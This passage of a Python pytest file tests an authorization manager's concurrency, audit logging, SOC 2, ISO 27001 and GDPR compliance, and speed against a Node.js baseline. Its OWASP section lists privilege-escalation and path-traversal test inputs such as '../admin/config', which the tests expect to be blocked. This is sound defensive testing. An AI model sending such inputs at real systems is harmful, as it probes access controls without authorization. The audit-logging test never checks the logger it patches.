            result = self.auth_manager._check_user_permissions(
                context, ['user.read'], allow_owner=False
            )
            end_time = time.perf_counter()
            
            return {
                'user_id': user_id,
                'iteration': iteration,
                'result': result,
                'time_ms': (end_time - start_time) * 1000
            }
        
        # Test concurrent authorization decisions
        start_time = time.perf_counter()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for i in range(100):
                user_id = f'concurrent_user_{i % 10}'
                future = executor.submit(authorization_task, user_id, i)
                futures.append(future)
            
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        end_time = time.perf_counter()
        total_time = end_time - start_time
        
        # Validate concurrent performance
        assert len(results) == 100
        assert all(result['result'] is True for result in results)
        
        avg_individual_time = sum(result['time_ms'] for result in results) / len(results)
        max_individual_time = max(result['time_ms'] for result in results)
        
        # Individual decisions should still be fast under concurrency
        assert avg_individual_time < 50  # 50ms average
        assert max_individual_time < 100  # 100ms max
        
        self.performance_results.append({
            'test': 'concurrent_authorization',
            'total_time_s': total_time,
            'avg_individual_time_ms': avg_individual_time,
            'max_individual_time_ms': max_individual_time,
            'concurrent_requests': 100,
            'threads': 10,
            'passed': avg_individual_time < 50
        })

    def teardown_method(self):
        """Analyze and report performance security results."""
        # Calculate overall performance compliance
        passing_tests = [r for r in self.performance_results if r['passed']]
        performance_compliance = len(passing_tests) / len(self.performance_results)
        
        # Validate performance requirements met
        assert performance_compliance >= 0.95  # 95% of tests must pass
        
        # Log performance summary
        for result in self.performance_results:
            print(f"Performance Test: {result['test']}")
            print(f"  Result: {'PASS' if result['passed'] else 'FAIL'}")
            if 'avg_time_ms' in result:
                print(f"  Average Time: {result['avg_time_ms']:.2f}ms")
        
        # Security overhead analysis
        if self.security_overhead_metrics:
            for metric in self.security_overhead_metrics:
                print(f"Security Overhead: {metric['overhead_percentage']:.1f}%")
                print(f"  Secured: {metric['secured_time_ms']:.2f}ms")
                print(f"  Unsecured: {metric['unsecured_time_ms']:.2f}ms")


class TestAuthorizationAuditAndCompliance:
    """
    Comprehensive audit and compliance testing for authorization system.
    
    Validates that authorization system meets enterprise compliance
    requirements including SOC 2, ISO 27001, and OWASP standards.
    """

    def setup_method(self):
        """Set up audit and compliance testing environment."""
        self.auth_manager = get_authorization_manager()
        self.audit_events = []
        self.compliance_violations = []

    @pytest.mark.asyncio
    async def test_authorization_audit_logging(self):
        """
        Test comprehensive audit logging for authorization decisions.
        
        Validates that all authorization events are properly logged
        with sufficient detail for compliance and forensic analysis.
        """
        # Test 1: Successful authorization audit
        with patch('src.auth.authorization.logger') as mock_logger:
            context = PermissionContext(
                user_id='audit_user_123',
                user_permissions={'user.read', 'user.write'},
                resource_id='audit_resource_456',
                resource_type='document',
                request_ip='192.168.1.100',
                request_method='GET',
                request_endpoint='/api/documents/456',
                session_id='session_123',
                correlation_id='correlation_456'
            )
            
            result = self.auth_manager._check_user_permissions(
                context, ['user.read'], allow_owner=False
            )
            
            # Verify audit logging occurred
            assert result is True
            # Note: In actual implementation, would verify logger.info/debug calls

        # Test 2: Failed authorization audit
        with patch('src.auth.authorization.logger') as mock_logger:
            failed_context = PermissionContext(
                user_id='failed_audit_user_789',
                user_permissions={'user.read'},  # Insufficient permissions
                resource_id='protected_resource_789',
                resource_type='document',
                request_ip='10.0.0.50',
                request_method='POST',
                request_endpoint='/api/admin/config',
                correlation_id='failed_correlation_789'
            )
            
            result = self.auth_manager._check_user_permissions(
                failed_context, ['admin.system'], allow_owner=False
            )
            
            assert result is False
            # Verify security violation logged
            
            self.audit_events.append({
                'event_type': 'authorization_denied',
                'user_id': 'failed_audit_user_789',
                'requested_permissions': ['admin.system'],
                'actual_permissions': ['user.read'],
                'resource_id': 'protected_resource_789',
                'source_ip': '10.0.0.50',
                'endpoint': '/api/admin/config',
                'correlation_id': 'failed_correlation_789',
                'timestamp': datetime.utcnow().isoformat()
            })

        # Test 3: Administrative override audit
        with patch('src.auth.authorization.logger') as mock_logger:
            admin_context = PermissionContext(
                user_id='admin_user_456',
                user_permissions={'admin.system', 'admin.override'},
                resource_id='any_resource_123',
                resource_type='document',
                request_ip='172.16.0.10',
                additional_context={'admin_override': True}
            )
            
            # Simulate administrative override
            result = self.auth_manager._check_user_permissions(
                admin_context, ['admin.system'], allow_owner=False
            )
            
            assert result is True
            
            self.audit_events.append({
                'event_type': 'admin_override_used',
                'user_id': 'admin_user_456',
                'resource_id': 'any_resource_123',
                'override_type': 'admin_system',
                'source_ip': '172.16.0.10',
                'timestamp': datetime.utcnow().isoformat()
            })

    @pytest.mark.asyncio
    async def test_compliance_validation(self):
        """
        Test compliance with enterprise security standards.
        
        Validates SOC 2, ISO 27001, and OWASP compliance through
        comprehensive security control validation.
        """
        # Test 1: SOC 2 Compliance - Access Control (CC6.1)
        soc2_test_cases = [
            {
                'user_id': 'soc2_user_123',
                'permissions': {'user.read'},
                'requested': ['admin.system'],
                'should_pass': False,
                'control': 'CC6.1 - Logical Access'
            },
            {
                'user_id': 'soc2_admin_456',
                'permissions': {'admin.system', 'admin.read'},
                'requested': ['admin.read'],
                'should_pass': True,
                'control': 'CC6.1 - Authorized Access'
            }
        ]
        
        for test_case in soc2_test_cases:
            context = PermissionContext(
                user_id=test_case['user_id'],
                user_permissions=set(test_case['permissions']),
                correlation_id=f"soc2_test_{test_case['user_id']}"
            )
            
            result = self.auth_manager._check_user_permissions(
                context, test_case['requested'], allow_owner=False
            )
            
            if result != test_case['should_pass']:
                self.compliance_violations.append({
                    'standard': 'SOC 2',
                    'control': test_case['control'],
                    'user_id': test_case['user_id'],
                    'expected': test_case['should_pass'],
                    'actual': result
                })

        # Test 2: ISO 27001 Compliance - Access Control (A.9.1.1)
        iso27001_test_cases = [
            {
                'description': 'Access control policy enforcement',
                'user_id': 'iso_user_789',
                'permissions': {'document.read'},
                'resource_owner': 'other_user_123',
                'allow_owner': True,
                'should_pass': False  # Not owner, insufficient permissions
            },
            {
                'description': 'Resource owner access',
                'user_id': 'iso_owner_456',
                'permissions': {'document.read'},
                'resource_owner': 'iso_owner_456',  # Is owner
                'allow_owner': True,
                'should_pass': True
            }
        ]
        
        for test_case in iso27001_test_cases:
            context = PermissionContext(
                user_id=test_case['user_id'],
                user_permissions=set(test_case['permissions']),
                resource_owner=test_case['resource_owner'],
                correlation_id=f"iso27001_test_{test_case['user_id']}"
            )
            
            # Mock ownership check
            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
                mock_ownership.return_value = (test_case['user_id'] == test_case['resource_owner'])
                
                result = self.auth_manager._check_user_permissions(
                    context, ['document.write'], allow_owner=test_case['allow_owner']
                )
                
                if result != test_case['should_pass']:
                    self.compliance_violations.append({
                        'standard': 'ISO 27001',
                        'control': 'A.9.1.1 - Access Control Policy',
                        'description': test_case['description'],
                        'user_id': test_case['user_id'],
                        'expected': test_case['should_pass'],
                        'actual': result
                    })

        # Test 3: OWASP Top 10 Compliance - Broken Access Control (A01:2021)
        owasp_attack_vectors = [
            {
                'name': 'Horizontal Privilege Escalation',
                'user_id': 'user_123',
                'target_user': 'user_456',
                'attack_type': 'access_other_user_data'
            },
            {
                'name': 'Vertical Privilege Escalation',
                'user_id': 'regular_user_789',
                'attempted_permission': 'admin.system',
                'attack_type': 'privilege_escalation'
            },
            {
                'name': 'Insecure Direct Object Reference',
                'user_id': 'idor_user_101',
                'resource_id': '../admin/config',
                'attack_type': 'path_traversal'
            }
        ]
        
        for attack in owasp_attack_vectors:
            context = PermissionContext(
                user_id=attack['user_id'],
                user_permissions={'user.read'},  # Basic permissions only
                resource_id=attack.get('resource_id', 'normal_resource'),
                correlation_id=f"owasp_test_{attack['user_id']}"
            )
            
            # All attack vectors should be blocked
            result = self.auth_manager._check_user_permissions(
                context, ['admin.system'], allow_owner=False
            )
            
            if result is True:  # Attack succeeded - compliance violation
                self.compliance_violations.append({
                    'standard': 'OWASP Top 10',
                    'vulnerability': 'A01:2021 - Broken Access Control',
                    'attack_vector': attack['name'],
                    'user_id': attack['user_id'],
                    'details': attack
                })

        # Validate no compliance violations
        assert len(self.compliance_violations) == 0, f"Compliance violations found: {self.compliance_violations}"

    @pytest.mark.asyncio
    async def test_data_retention_and_privacy(self):
        """
        Test data retention and privacy compliance.
        
        Validates that authorization system properly handles data
        retention requirements and privacy controls per GDPR and
        other privacy regulations.
        """
        # Test 1: Data minimization validation
        context = PermissionContext(
            user_id='privacy_user_123',
            user_permissions={'user.read'},
            # Minimal required data only
            correlation_id='privacy_test_123'
        )
        
        # Verify context contains only necessary data
        context_dict = context.to_dict()
        required_fields = {'user_id', 'correlation_id', 'evaluation_timestamp'}
        actual_fields = set(context_dict.keys())
        
        # Should not contain unnecessary personal data
        prohibited_fields = {'ssn', 'credit_card', 'phone_number', 'address'}
        privacy_violation = prohibited_fields.intersection(actual_fields)
        
        assert len(privacy_violation) == 0, f"Privacy violation: {privacy_violation}"

        # Test 2: Audit log data retention
        audit_events_with_retention = []
        
        for i, event in enumerate(self.audit_events):
            # Add retention metadata
            event_with_retention = event.copy()
            event_with_retention.update({
                'retention_period_days': 2555,  # 7 years for SOC 2
                'retention_classification': 'security_audit',
                'data_subject': event.get('user_id'),
                'deletion_date': (datetime.utcnow() + timedelta(days=2555)).isoformat()
            })
            audit_events_with_retention.append(event_with_retention)

        # Validate retention metadata
        for event in audit_events_with_retention:
            assert 'retention_period_days' in event
            assert 'deletion_date' in event
            assert event['retention_period_days'] > 0

        # Test 3: Right to erasure (GDPR Article 17)
        gdpr_user_id = 'gdpr_erasure_user_456'
        
        # Simulate user data erasure request
        erasure_audit_events = [
            event for event in self.audit_events 
            if event.get('user_id') == gdpr_user_id
        ]
        
        # After erasure, events should be anonymized
        for event in erasure_audit_events:
            anonymized_event = event.copy()
            anonymized_event['user_id'] = 'ANONYMIZED'
            anonymized_event['data_subject'] = 'ERASED'
            anonymized_event['erasure_date'] = datetime.utcnow().isoformat()
            
            # Verify anonymization preserves audit value
            assert 'event_type' in anonymized_event  # Audit trail preserved
            assert anonymized_event['user_id'] == 'ANONYMIZED'  # PII removed

    def teardown_method(self):
        """Validate overall audit and compliance posture."""
        # Compliance summary
        total_audit_events = len(self.audit_events)
        total_violations = len(self.compliance_violations)
        
        print(f"Audit Events Generated: {total_audit_events}")
        print(f"Compliance Violations: {total_violations}")
        
        # Zero tolerance for compliance violations
        assert total_violations == 0, "Zero tolerance for compliance violations"
        
        # Minimum audit coverage
        assert total_audit_events >= 3, "Insufficient audit event coverage"
        
        # Audit event quality validation
        for event in self.audit_events:
            required_audit_fields = {'event_type', 'user_id', 'timestamp'}
            event_fields = set(event.keys())
            
            missing_fields = required_audit_fields - event_fields
            assert len(missing_fields) == 0, f"Missing audit fields: {missing_fields}"


# Performance benchmarking for authorization system
@pytest.mark.performance
class TestAuthorizationPerformanceBenchmarks:
    """
    Performance benchmarking tests to ensure ≤10% variance from Node.js baseline.
    
    These tests validate that the Python authorization system maintains
    performance parity with the original Node.js implementation.
    """

    def setup_method(self):
        """Set up performance benchmarking environment."""
        self.auth_manager = get_authorization_manager()
        self.baseline_times = {
            'simple_permission_check': 5.0,  # ms - Node.js baseline
            'complex_permission_check': 12.0,  # ms
            'resource_ownership_check': 8.0,  # ms
            'role_hierarchy_check': 15.0,  # ms
        }
        self.variance_threshold = 0.10  # 10% variance allowance

    @pytest.mark.asyncio
    async def test_permission_check_performance_benchmark(self):
        """Benchmark permission checking performance against Node.js baseline."""
        context = PermissionContext(
            user_id='benchmark_user_123',
            user_permissions={'user.read', 'user.write', 'document.read'},
            resource_id='benchmark_resource',
            resource_type='document'
        )
        
        # Warm up
        for _ in range(10):
            self.auth_manager._check_user_permissions(context, ['user.read'], allow_owner=False)
        
        # Benchmark simple permission check
        start_time = time.perf_counter()
        iterations = 1000
        
        for _ in range(iterations):
            result = self.auth_manager._check_user_permissions(
                context, ['user.read'], allow_owner=False
            )
            assert result is True
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / iterations) * 1000
        
        baseline_ms = self.baseline_times['simple_permission_check']
        variance = abs(avg_time_ms - baseline_ms) / baseline_ms
        
        print(f"Simple Permission Check: {avg_time_ms:.2f}ms (baseline: {baseline_ms}ms, variance: {variance:.1%})")
        
        assert variance <= self.variance_threshold, f"Performance variance {variance:.1%} exceeds {self.variance_threshold:.1%} threshold"

    @pytest.mark.asyncio
    async def test_complex_authorization_benchmark(self):
        """Benchmark complex authorization scenarios against baseline."""
        complex_context = PermissionContext(
            user_id='complex_benchmark_user',
            user_permissions={
                'user.read', 'user.write', 'document.read', 'document.write',
                'project.read', 'project.write', 'admin.read'
            },
            resource_id='complex_resource',
            resource_type='document'
        )
        
        complex_permissions = ['document.read', 'document.write', 'project.read']
        
        # Benchmark complex permission evaluation
        start_time = time.perf_counter()
        iterations = 500
        
        for _ in range(iterations):
            result = self.auth_manager._check_user_permissions(
                complex_context, complex_permissions, allow_owner=True
            )
            assert result is True
        
        end_time = time.perf_counter()
        avg_time_ms = ((end_time - start_time) / iterations) * 1000
        
        baseline_ms = self.baseline_times['complex_permission_check']
        variance = abs(avg_time_ms - baseline_ms) / baseline_ms
        
        print(f"Complex Permission Check: {avg_time_ms:.2f}ms (baseline: {baseline_ms}ms, variance: {variance:.1%})")
        
        assert variance <= self.variance_threshold, f"Complex authorization variance {variance:.1%} exceeds threshold"

    def teardown_method(self):
        """Validate overall performance compliance."""
        print("Authorization Performance Benchmarking Complete")
        print(f"Variance Threshold: {self.variance_threshold:.1%}")
        print("All benchmarks must meet ≤10% variance requirement")